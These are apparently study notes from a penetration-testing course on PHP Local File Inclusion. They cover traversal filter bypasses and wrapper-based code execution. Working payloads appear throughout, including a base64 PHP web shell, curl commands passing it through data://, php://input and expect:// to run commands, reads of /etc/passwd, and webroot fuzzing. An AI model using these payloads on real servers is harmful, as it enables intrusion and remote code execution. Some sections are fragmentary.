## Path Traversal
This would work if the whole input was used within the `include()` function without any additions, like the following example:
```php
include($_GET['language']);
```

In this case, if we try to read `/etc/passwd`, then the `include()` function would fetch that file directly.
## Filename Prefix
```php
include("lang_" . $_GET['language']);
```
## Appended Extensions

Another very common example is when an extension is appended to the `language` parameter, as follows:
```php
include($_GET['language'] . ".php");
```
This is quite common, as in this case, we would not have to write the extension every time we need to change the language. This may also be safer as it may restrict us to only including PHP files. In this case, if we try to read `/etc/passwd`, then the file included would be `/etc/passwd.php`, which does not exist.
## Second-Order Attacks
This occurs because many web application functionalities may be insecurely pulling files from the back-end server based on user-controlled parameters.

For example, a web application may allow us to download our avatar through a URL like (`/profile/$username/avatar.png`). If we craft a malicious LFI username (e.g. `../../../etc/passwd`), then it may be possible to change the file being pulled to another local file on the server and grab it instead of our avatar.

In this case, we would be poisoning a database entry with a malicious LFI payload in our username. Then, another web application functionality would utilize this poisoned entry to perform our attack (i.e. download our avatar based on username value). This is why this attack is called a `Second-Order` attack.
## Basic Bypasses
## Non-Recursive Path Traversal Filters
One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (`../`) to avoid path traversals. For example:
```php
$language = str_replace('../', '', $_GET['language']);
```
However, this filter is very insecure, as it is not `recursively removing` the `../` substring, as it runs a single time on the input string and does not apply the filter on the output string. For example, if we use `....//` as our payload, then the filter would remove `../` and the output string would be `../`, which means we may still perform path traversal.
. The `....//` substring is not the only bypass we can use, as we may use `..././` or `....\/` and several other recursive LFI payloads.
## Encoding
If the target web application did not allow `.` and `/` in our input, we can URL encode `../` into `%2e%2e%2f`, which may bypass the filter.
## Approved Paths
Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application we have been dealing with may only accept paths that are under the `./languages` directory, as follows:
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

To find the approved path, we can examine the requests sent by the existing forms, and see what path they use for the normal web functionality. Furthermore, we can fuzz web directories under the same path, and try different ones until we get a match.
## Appended Extension
#### Path Truncation
In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be `truncated`, and any characters after the maximum length will be ignored.
An example of such payload would be the following:
```url
?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
```
Of course, we don't have to manually type `./` 2048 times (total of 4096 characters), but we can automate the creation of this string with the following command:
```shell
$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```
#### Null Bytes
PHP versions before 5.5 were vulnerable to `null byte injection`, which means that adding a null byte (`%00`) at the end of the string would terminate the string and not consider anything after it.

## PHP Filters
### Input Filters
[PHP Filters](https://www.php.net/manual/en/filters.php) are a type of PHP wrapper, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the `php://` scheme in our string, and we can access the PHP filter wrapper with `php://filter/`.
The `filter` wrapper has several parameters, but the main ones we require for our attack are `resource` and `read`. The `resource` parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the `read` parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.
There are four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php). You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the `convert.base64-encode` filter, under `Conversion Filters`.
## Source Code Disclosure
```url
php://filter/read=convert.base64-encode/resource=config
```
#### Remote Code Execution

With `allow_url_include` enabled, we can proceed with our `data` wrapper attack. We can also pass it `base64` encoded strings with `text/plain;base64`, and it has the ability to decode them and execute the PHP code.
```shell-session
echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```
Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`
```shell
$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```
## Input

Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the `input` wrapper also depends on the `allow_url_include` setting, as mentioned earlier.

To repeat our earlier attack but with the `input` wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter, as we did in our previous attack:

PHP Wrappers

```shell
$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```
## Expect
Finally, we may utilize the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to directly run commands through URL streams.
We can determine whether it is installed on the back-end server just like we did with `allow_url_include` earlier, but we'd `grep` for `expect` instead, and if it is installed and enabled we'd get the following:
```shell
$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```
```shell
$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

Once we identify an exposed parameter that isn't linked to any forms we tested, we can perform all of the LFI tests discussed in this module.

### Fuzzing Server Files

In addition to fuzzing LFI payloads, there are different server files that may be helpful in our LFI exploitation, so it would be helpful to know where such files exist and whether we can read them. Such files include: `Server webroot path`, `server configurations file`, and `server logs`.
#### Server Webroot
To do so, we can fuzz for the `index.php` file through common webroot paths, which we can find in this [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Depending on our LFI situation, we may need to add a few back directories (e.g. `../../../../`), and then add our `index.php` afterwards.
```shell
$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

## LFI Tools

Finally, we can utilize a number of LFI tools to automate much of the process we have been learning, which may save time in some cases, but may also miss many vulnerabilities and files we may otherwise identify through manual testing. The most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy). We can also search GitHub for various other LFI tools and scripts, but in general, most tools perform the same tasks, with varying levels of success and accuracy.

Unfortunately, most of these tools are not maintained and rely on the outdated `python2`, so using them may not be a long term solution. Try downloading any of the above tools and test them on any of the exercises we've used in this module to see their level of accuracy.
